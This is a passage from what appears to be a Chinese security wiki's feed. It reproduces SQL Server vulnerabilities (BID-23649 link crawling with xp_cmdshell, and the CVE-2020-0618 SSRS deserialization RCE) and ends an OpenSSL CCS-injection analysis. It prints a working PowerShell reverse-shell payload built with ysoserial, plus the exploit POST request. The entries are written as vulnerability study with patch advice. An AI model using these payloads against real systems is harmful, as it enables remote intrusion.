在正常的情况下，如此类握手，在客户端和服务器双方进行验证后，TLS握手立即终止时，Finished消息（包含已交换的所有握手消息的verify_data中包含散列）都将不一致。但是，当客户端和服务器都使用易受攻击的OpenSSL库时，它们最终将根据正确的主密钥计算并验证客户端和服务器的Finished消息的verify_data哈希。 </p><p>​        在客户端上，这是因为在处理多个Change Cipher Spec消息时，ssl3_do_change_cipher_spec（）每次都会调用final_finish_mac（）来计算其Finished消息。 收到所有必要的加密信息（特别是服务器Certificate消息）后，客户端将计算其预主密钥（premaster key）和主密钥（master key）并更新其s-&gt; session-&gt; master_key。 任何后续的Change Cipher Spec消息都会导致使用新的主密钥（master key）为已保存的握手消息计算verify_data。 </p><p>​        在服务器端，当从ssl3_do_change_cipher_spec（）接收到Change Cipher Spec时，以及从函数ssl3_get_cert_verify（）接收到客户端的Finished消息时，都调用了final_finish_mac（），该函数调用ssl3_get_message（），该函数会重新计算带有验证信息的主密钥（master key）。</p><p>​        由于Change Cipher Spec不是握手消息，而是具有自己的记录，因此它不参与verify_data的计算，因此可以注入到流中。如上所述，即使使用空的主密钥（master key），Finished消息中的verify_data也将排队等待验证，并且TLS会话也将使用弱主密钥（master key）来建立。</p><p>[1]  <a href="http://tools.ietf.org/html/rfc4346">http://tools.ietf.org/html/rfc4346</a><br>[2]  <a href="http://tools.ietf.org/html/rfc5246">http://tools.ietf.org/html/rfc5246</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href></a></li><li><a href></a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SSL-TLS协议简介&quot;&gt;&lt;a href=&quot;#SSL-TLS协议简介&quot; class=&quot;headerlink&quot; title=&quot;SSL/TLS协议简介&quot;&gt;&lt;/a&gt;SSL/TLS协议简介&lt;/h2&gt;&lt;p&gt;安全套接字层（SSL）和传输层安全性（TLS）是加密协议，通过TCP</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="OpenSSL" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/"/>
    
    
    <category term="OpenSSL" scheme="http://example.com/tags/OpenSSL/"/>
    
  </entry>
  
  <entry>
    <title>BID-23649_SQL Server链接爬网命令执行漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T06:44:33.000Z</published>
    <updated>2021-07-06T07:53:27.104Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h3><ul><li>漏洞名称：Microsoft SQL Server 数据库链接爬网命令执行漏洞</li><li>CVE编号：暂无</li><li>CNVD编号：暂无</li><li>Bugtraq 编号：23649</li><li>漏洞类型：代码执行</li></ul><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​       Microsoft SQL Server 数据库链接爬网命令执行漏洞。远程攻击者利用，数据库链接查询功能无凭证要求特点，通过openquery()函数，执行远程代码。</p><p>​        msf脚本公开于2012/12/25</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>​        Microsoft SQL Server 2000 2005</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>​        暂无</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>​        在win 7 上部署 mssql 2005，并配置开启远程连接。</p><p>​        kali上使用msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mssql/mssql_linkcrawler</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/msf-use.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/msf-config.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/msf-exploit.png"></p><p>​        最终反弹shell成功。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/shell.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​        Database Link 数据库链接的作用是，允许一个数据库服务器去对其他的数据库服务器进行查询，通常配置此功能会使数据库服务器，拥有过多的特权。使用openquery()函数，对被链接的数据库服务器进行查询；也可以执行xp_cmdshell，对远程访问也无凭证要求。</p><p>​    通常情况下链接的数据库服务器的部署图如下：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/diagram.png"></p><p>​        列出所有链接的服务器名，通常有两个选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_linkedservers</span><br></pre></td></tr></table></figure><p>​        和</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvname FROM master..syservers</span><br></pre></td></tr></table></figure><p>​        查询一个服务器的所有链接的服务器名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvnaem From openquery(DB1, &#x27;select srvname FROM master..sysservers&#x27;)</span><br></pre></td></tr></table></figure><p>​        查询一个服务器的某个链接的服务器所链接的服务器名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvnaem From openquery(DB1, &#x27;select srvname FROM openquery(HVA, &quot;SELECT srvname FROM master..syservers&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p>​        查询可以一直嵌套执行，直到穷尽所有数据库服务器。</p><p>​        在链接的服务器上执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM openquery(DB1, &#x27;SELECT * FROM openquery(HVA, &quot;SELECT 1; exec xp_cmdshell&#x27;&quot;&#x27;ping 192.168.1.1&quot;&quot; &#x27;&#x27;)&#x27;)</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://www.exploit-db.com/exploits/23649">https://www.exploit-db.com/exploits/23649</a></li><li><a href="https://www.slideshare.net/nullbind/sql-server-exploitation-escalation-pilfering-appsec-usa-2012">https://www.slideshare.net/nullbind/sql-server-exploitation-escalation-pilfering-appsec-usa-2012</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞名称&quot;&gt;&lt;a href=&quot;#漏洞名称&quot; class=&quot;headerlink&quot; title=&quot;漏洞名称&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="MSSQL" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/"/>
    
    
    <category term="MSSQL" scheme="http://example.com/tags/MSSQL/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0618_SQL Server Reporting Services远程代码执行漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T06:37:18.000Z</published>
    <updated>2021-07-06T07:52:53.313Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h3><ul><li>漏洞名称：Microsoft SQL Server Reporting Services远程代码执行漏洞</li><li>CVE编号：CVE-2020-0618</li><li>CNVD编号：CNVD-2020-10449</li><li>BID编号：暂无</li><li>漏洞类型：代码执行</li></ul><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Microsoft SQL Server Reporting Services存在远程代码执行漏洞。攻击者可以利用该漏洞利用序列化的对象编写HTTP POST请求，以实现远程代码执行。该漏洞是由于序列化的Blob未由服务器签名而造成的。（Blob 对象表示一个不可变、原始数据的类文件对象。）</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Microsoft SQL Server 2012 for 32-bit Systems Service Pack 4<br>Microsoft SQL Server 2012 for x64-based Systems Service Pack 4<br>Microsoft SQL Server 2014 Service Pack 3 for 32-bit Systems<br>Microsoft SQL Server 2014 Service Pack 3 for 32-bit Systems<br>Microsoft SQL Server 2014 Service Pack 3 for x64-based Systems<br>Microsoft SQL Server 2014 Service Pack 3 for x64-based Systems<br>Microsoft SQL Server 2016 for x64-based Systems Service Pack 2<br>Microsoft SQL Server 2016 for x64-based Systems Service Pack 2</p><p>解决方案</p><p>1.使用SQL Server 2012-2016的用户请尽快安装相关<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0618">补丁</a></p><p>2.使用SQL Server 2008的用户请为数据库设置强口令，或者将Reporting Services监听ip改为本地。暂时禁用外部连接，保证此服务安全。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1、Windows Server 2016 Datacenter（<a href="https://msdn.itellyou.cn/%EF%BC%89">https://msdn.itellyou.cn/）</a><br>2、SQL Server 2016 Developer Edition x64（<a href="https://msdn.itellyou.cn/%EF%BC%89">https://msdn.itellyou.cn/）</a></p><p>链接:<a href="https://pan.baidu.com/s/1lgI_OoayhbFyYF8Hm-XCEw">https://pan.baidu.com/s/1lgI_OoayhbFyYF8Hm-XCEw</a><br>提取码:gsl1</p><p>3、Postman-win64-7.22.1（<a href="https://www.postman.com/%EF%BC%89">https://www.postman.com/）</a><br>4、netcat-1.11（<a href="https://eternallybored.org/misc/netcat/%EF%BC%89">https://eternallybored.org/misc/netcat/）</a><br>5、ysoserial-1.32（<a href="https://github.com/pwntester/ysoserial.net%EF%BC%89">https://github.com/pwntester/ysoserial.net）</a></p><h3 id="SQL-server-2016安装"><a href="#SQL-server-2016安装" class="headerlink" title="SQL server 2016安装"></a>SQL server 2016安装</h3><p>​        SQL Server 2016 Developer Edition x64安装过程如下图，其中需要额外注意的步骤已用红色圈出，其他步骤下一步即可</p><p>​        出现漏洞的服务为Reporting Services，此服务默认情况下并不安装，需要用户安装时手动安装。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"></p><p>​        选择混合模式并设置sa的密码123456；</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        点击安装即可。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png">        </p><h3 id="配置-Reporting-Services"><a href="#配置-Reporting-Services" class="headerlink" title="配置 Reporting Services"></a>配置 Reporting Services</h3><p>​        安装并配置完sql server及reporting services，启动“Reporting Services 配置管理器”，如下图</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png"></p><p>​        点击“连接”进入配置管理器，如下图表示成功启动；</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/6.png"></p><p>​        重点访问 <a href="http://localhost/ReportS%EF%BC%8C%E5%88%9B%E5%BB%BA%E5%88%86%E9%A1%B5%E6%8A%A5%E8%A1%A8%EF%BC%8C%E6%8F%90%E7%A4%BA%E9%9C%80%E8%A6%81%E5%AE%89%E8%A3%85%E6%8A%A5%E8%A1%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">http://localhost/ReportS，创建分页报表，提示需要安装报表服务器。</a></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/reporting-setting.png"></p><p>​        安装好报表服务器后，新建一个报表；</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/chuangjianbaobiao.png"></p><p>​        输入前面设置的账号sa和密码 。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/sa.png"></p><p>​        保存，点击运行；</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/save.png"></p><p>​        访问一下漏洞路径<a href="http://10.251.0.34/ReportServer/pages/ReportViewer.aspx%EF%BC%8C%E6%88%90%E5%8A%9F%E3%80%82">http://10.251.0.34/ReportServer/pages/ReportViewer.aspx，成功。</a></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/visit.png"></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        安装并启动BurpSuite，发送方式POST，地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.251.0.34/ReportServer/pages/ReportViewer.aspx</span><br></pre></td></tr></table></figure><p>​        Body中填入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NavigationCorrector$PageState=NeedsCorrection</span><br><span class="line">NavigationCorrector$ViewState=payload（payload生成方式下面会讲述）</span><br><span class="line">__VIEWSTATE=</span><br></pre></td></tr></table></figure><p>​        注意此处如果不配置Authorization，发送后会返回401 unauthorized；</p><p>​        NTLM凭据基于在交互式登录过程中获得的数据，并且由域名，用户名和用户密码的单向哈希组成。当应用程序使用NTLM身份验证时，需要配置Burp Suite以自动执行身份验证过程。</p><p>​        可以在用户选项&gt;连接&gt;平台身份验证中配置这些设置。使用添加功能来配置新的凭据。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/burp-NTLM.png"></p><p>​        payload生成方式，在powershell中依次执行如下4条命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$command = &#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;10.251.0.34&quot;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  =$sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;</span><br><span class="line"></span><br><span class="line">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)</span><br><span class="line"></span><br><span class="line">$encodedCommand = [Convert]::ToBase64String($bytes)</span><br><span class="line"></span><br><span class="line">.\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c &quot;powershell.exe -encodedCommand $encodedCommand&quot; -o base64 | clip</span><br></pre></td></tr></table></figure><p>​        将第1条命令中的ip地址和端口改为你的nc监听的地址和端口，执行完上述4条命令后，payload会复制到剪贴板，直接粘贴到上述的payload位置。</p><p><img src="/powershell.png"></p><p>​        使用burpsuite执行发包。</p><p><img src="/SUCCESS.PNG"></p><p>​        kali开启nc监听端口，反弹shell成功。</p><p><img src="/SUCCESS-SHELL.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​        <a href="https://docs.microsoft.com/en-us/sql/reporting-services/create-deploy-and-manage-mobile-and-paginated-reports">SQL Server Reporting Services（SSRS）</a>提供了一组本地工具和服务，用于创建，部署和管理移动报告和分页报告。</p><p>​        SSRS Web应用程序中的功能允许低特权用户帐户通过利用反序列化问题在服务器上运行代码。</p><p>只有授权用户才能访问该应用程序，但是最低权限（浏览器角色）也可利用此漏洞。</p><p>​        漏洞出现在ReportingServicesWebServer.dll中，此文件位于SQL Server安装目录下Reporting ServicesReportServerbin，出现问题的函数是Microsoft.Reporting.WebForms.BrowserNavigationCorrector中的OnLoad方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rotected override void OnLoad(EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">base.OnLoad(e);</span><br><span class="line">this.EnsureChildControls();</span><br><span class="line">if (this.Page.IsPostBack &amp;&amp; string.Equals(this.m_pageState.Value, &quot;NeedsCorrection&quot;, StringComparison.Ordinal))</span><br><span class="line">&#123;</span><br><span class="line">string value = this.m_viewerViewState.Value;</span><br><span class="line">if (!string.IsNullOrEmpty(value))</span><br><span class="line">&#123;</span><br><span class="line">LosFormatter losFormatter = new LosFormatter();</span><br><span class="line">object obj = null;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">obj = losFormatter.Deserialize(value);</span><br></pre></td></tr></table></figure><pre><code>    可以看到此处使用LosFormatter类直接将value进行反序列化处理产生的漏洞，</code></pre><p>​        该BrowserNavigationCorrector类的实例化并且调用的位置在<br>Microsoft.ReportingServices.WebServer.ReportViewerPage中的OnInit方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">protected override void OnInit(EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">base.OnInit(e);</span><br><span class="line">ReportViewerHost reportViewer = this.ReportViewer;</span><br><span class="line">reportViewer.EnableHybrid = this.ShowHybrid;</span><br><span class="line">if (reportViewer != null)</span><br><span class="line">&#123;</span><br><span class="line">PageRequestManagerErrorHandler child = new PageRequestManagerErrorHandler();</span><br><span class="line">reportViewer.Parent.Controls.AddAt(reportViewer.Parent.Controls.IndexOf(reportViewer), child);</span><br><span class="line">BrowserNavigationCorrector child2 = reportViewer.CreateNavigationCorrector();</span><br><span class="line">reportViewer.Parent.Controls.AddAt(reportViewer.Parent.Controls.IndexOf(reportViewer), child2);</span><br></pre></td></tr></table></figure><p>​        通过此处可以定位到路由为ReportServer/pages/ReportViewer.aspx</p><p>​        可以通过本地 SharePoint服务器中的/ReportServer/pages/ReportViewer.aspx页面来触发此功能。</p><p>概念验证<br>可以将以下HTTP请求发送到服务器以利用该应用程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /ReportServer/pages/ReportViewer.aspx HTTP/1.1</span><br><span class="line">Host: target</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: X</span><br><span class="line"></span><br><span class="line">NavigationCorrector$PageState=NeedsCorrection&amp;NavigationCorrector$ViewState=[PayloadHere]&amp;__VIEWSTATE=</span><br></pre></td></tr></table></figure><p>可以在PowerShell中使用以下命令来使用ysoserial.net工具生成有效负载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$command = &#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;10.251.0.33&quot;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  =$sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;</span><br><span class="line"></span><br><span class="line">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)</span><br><span class="line"></span><br><span class="line">$encodedCommand = [Convert]::ToBase64String($bytes)</span><br><span class="line"></span><br><span class="line">.\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c &quot;powershell.exe -encodedCommand $encodedCommand&quot; -o base64 | clip</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-0618">https://nvd.nist.gov/vuln/detail/CVE-2020-0618</a></li><li><a href="http://packetstormsecurity.com/files/156707/SQL-Server-Reporting-Services-SSRS-ViewState-Deserialization.html">http://packetstormsecurity.com/files/156707/SQL-Server-Reporting-Services-SSRS-ViewState-Deserialization.html</a></li><li><a href="https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-0618">https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-0618</a></li><li><a href="https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/">https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/</a></li><li><a href="https://social.msdn.microsoft.com/Forums/sqlserver/en-US/b3145fc2-7c9c-41f4-9cd3-e1ba3ed2b708/reporting-services-web-portal-error-the-report-server-was-unable-to-validate-the-integrity-of?forum=sqlreportingservices">https://social.msdn.microsoft.com/Forums/sqlserver/en-US/b3145fc2-7c9c-41f4-9cd3-e1ba3ed2b708/reporting-services-web-portal-error-the-report-server-was-unable-to-validate-the-integrity-of?forum=sqlreportingservices</a></li><li><a href="https://xz.aliyun.com/t/7891">https://xz.aliyun.com/t/7891</a></li><li><a href="https://blog.csdn.net/qq_40989258/article/details/105344344">https://blog.csdn.net/qq_40989258/article/details/105344344</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞名称&quot;&gt;&lt;a href=&quot;#漏洞名称&quot; class=&quot;headerlink&quot; title=&quot;漏洞名称&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="MSSQL" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/"/>
    
    
    <category term="MSSQL" scheme="http://example.com/tags/MSSQL/"/>
    
  </entry>
  
  <entry>
    <title>1-Cobalt Strike基础中篇</title>
    <link href="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/"/>
    <id>http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/</id>
